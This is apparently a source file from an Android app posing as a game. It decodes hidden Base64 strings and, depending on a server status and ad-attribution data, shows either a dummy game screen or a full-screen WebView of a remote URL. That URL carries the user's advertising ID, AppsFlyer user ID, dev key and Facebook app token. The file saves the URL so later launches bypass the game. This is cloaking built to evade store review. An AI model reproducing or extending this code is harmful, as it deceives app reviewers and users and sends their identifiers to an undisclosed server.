package com.goddes.egypyte.activity;

import static com.goddes.egypyte.fragments.FragmentWebEG.webViewFullAppEG;
import static com.goddes.egypyte.modelEG.AppEG.czssx;
import static com.goddes.egypyte.modelEG.AppEG.vzsa;
import static com.goddes.egypyte.modelEG.AppEG.vszcs;
import static com.goddes.egypyte.modelEG.AppEG.bffx;
import static com.goddes.egypyte.modelEG.AppEG.cxzcsa;
import static com.goddes.egypyte.settingsEG.WebSetEG.nhdfs;
import static com.goddes.egypyte.settingsEG.WebSetEG.csgsa;
import static com.goddes.egypyte.settingsEG.WebSetEG.cacs;
import static com.goddes.egypyte.settingsEG.WebSetEG.nhfsr;
import static com.goddes.egypyte.settingsEG.WebSetEG.as;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.Handler;
import android.os.Vibrator;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.lifecycle.ViewModelProvider;
import androidx.navigation.NavController;
import androidx.navigation.Navigation;

import com.goddes.egypyte.R;
import com.goddes.egypyte.fragments.FragmentButtEG;
import com.goddes.egypyte.fragments.FragmentInternetEG;
import com.goddes.egypyte.modelEG.ConnectionsEG;
import com.goddes.egypyte.modelEG.DeepEG;
import com.goddes.egypyte.settingsEG.DecodeEG;
import com.goddes.egypyte.settingsEG.ParEG;
import com.goddes.egypyte.settingsEG.WebSetEG;
import com.goddes.egypyte.viewmodelEG.VmEg;
import com.onesignal.OneSignal;

public class EG extends AppCompatActivity {

    private boolean csa() {
        String cxzds = Context.CONNECTIVITY_SERVICE;
        ConnectivityManager czcs = (ConnectivityManager) getSystemService(cxzds);
        if (czcs.getActiveNetworkInfo() == null) {
            return false;
        } else {
            return true;
        }
    }

    public static String sada;
    private void starEG(){

        if (vszcs.equals(DecodeEG.decodeEG("Tm9uLW9yZ2FuaWM="))) {
            sada = connectionsEG.getUrlEG() + vzsa;
            Log.d("weq","App"+ sada);
            navControllerEG.navigate(R.id.fragmentWebEG);
            getSharedPreferences(getPackageName(), MODE_PRIVATE).edit().putString(DecodeEG.decodeEG("c2F2ZWRVcmw="), sada).apply();

        } else if (deepEG.getDeepEG() != null) {
            sada = connectionsEG.getUrlEG() + deepEG.getStrDeepLinkEG();
            navControllerEG.navigate(R.id.fragmentWebEG);
            Log.d("weq","Deeo"+ sada);
            getSharedPreferences(getPackageName(), MODE_PRIVATE).edit().putString(DecodeEG.decodeEG("c2F2ZWRVcmw="), sada).apply();


        } else {
            if (connectionsEG.getStatusEG().equals("0")) {
                navControllerEG.navigate(R.id.fragmentButtEG);
                Log.d("weq","Game");
            } else {

                sada = connectionsEG.getUrlEG() + DecodeEG.decodeEG("P21lZGlhX3NvdXJjZT1vcmdhbmlj") +
                        DecodeEG.decodeEG("Jmdvb2dsZV9hZGlkPQ==") + cxzcsa +
                        DecodeEG.decodeEG("JmFmX3VzZXJpZD0=") + czssx +
                        DecodeEG.decodeEG("JmRldl9rZXk9") + DecodeEG.decodeEG(bffx) +
                        DecodeEG.decodeEG("JmJ1bmRsZT0=") + getPackageName() +
                        DecodeEG.decodeEG("JmZiX2FwcF9pZD0=") + connectionsEG.getFbIdEG() +
                        DecodeEG.decodeEG("JmZiX2F0PQ==") + connectionsEG.getFbTokenEG();
                navControllerEG.navigate(R.id.fragmentWebEG);
                Log.d("weq","Organic"+ sada);
                getSharedPreferences(getPackageName(), MODE_PRIVATE).edit().putString(DecodeEG.decodeEG("c2F2ZWRVcmw="), sada).apply();

            }
        }

    }

    public static NavController navControllerEG;
    public static Vibrator casw;
    public static WebSetEG webSetEG;
    public static VmEg vmEg;
    public DeepEG deepEG;
    private ConnectionsEG connectionsEG;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.eg);
        vmEg = new ViewModelProvider
                .AndroidViewModelFactory(getApplication())
                .create(VmEg.class);
        FragmentButtEG.eg = this;
        casw = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
        navControllerEG = Navigation.findNavController(this, R.id.nav_host_fragmentEG);
        webSetEG = new WebSetEG(this);
        FragmentInternetEG.eg = this;
        ParEG.eg = this;

        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
        OneSignal.initWithContext(this);
        OneSignal.setAppId(DecodeEG.decodeEG("ODYwZDdmZTctM2IzYi00M2YwLWE4ODEtOGJkYjlkMjk2NTdi"));
        vmEg.appEG(this);
        String sss =getSharedPreferences(getPackageName(), MODE_PRIVATE).getString(DecodeEG.decodeEG("c2F2ZWRVcmw="), DecodeEG.decodeEG("bnVsbA=="));
        if (!csa()) {
            navControllerEG.navigate(R.id.fragmentInternetEG);
        } else {

            if (sss.equals(DecodeEG.decodeEG("bnVsbA=="))){
             connectionsEG = vmEg.connectionsVM();
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    ParEG.setFbToken(connectionsEG.getFbIdEG());
                    ParEG.setFbId(connectionsEG.getFbIdEG());
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            deepEG = vmEg.deepEG(connectionsEG.getFbIdEG(),EG.this);
                            new CountDownTimer(15000,1000){

                                @Override
                                public void onTick(long l) {

                                    if (!vszcs.equals("-") || !deepEG.getStrDeepLinkEG().equals("-")) {
                                        cancel();
                                        starEG();
                                    } else {
                                    }

                                }

                                @Override
                                public void onFinish() {
                                    starEG();
                                }
                            }.start();

                        }
                    });
                }
            },2000);}else {
                sada = sss;
                navControllerEG.navigate(R.id.fragmentWebEG);
            }
        }
    }

    @Override
    public void onBackPressed() {
        if (webViewFullAppEG.isFocused() && webViewFullAppEG.canGoBack()) {
            webViewFullAppEG.goBack();
        }
    }

    @Override
    protected void onActivityResult(int dsfs, int xaxd, @Nullable Intent vda) {
        if (dsfs != cacs || nhfsr == null) {
            super.onActivityResult(dsfs, xaxd, vda);
            return;
        }
        Uri[] vdsa = null;
        if (xaxd == Activity.RESULT_OK) {
            if (vda == null) {
                if (as != null) {
                    vdsa = new Uri[]{Uri.parse(as)};
                }
            } else {
                String vdagd = vda.getDataString();
                if (vdagd != null) {
                    vdsa = new Uri[]{Uri.parse(vdagd)};
                }
            }
        }
        nhfsr.onReceiveValue(vdsa);
        nhfsr = null;
        if (csgsa == null) {
            super.onActivityResult(dsfs, xaxd, vda);
            return;
        }
        Uri vdawd = null;
        try {
            if (xaxd != RESULT_OK) {
                vdawd = null;
            } else {
                vdawd = vda == null ? nhdfs : vda.getData();
            }
        } catch (Exception e) {
        }
        csgsa.onReceiveValue(vdawd);
        csgsa = null;
    }
}
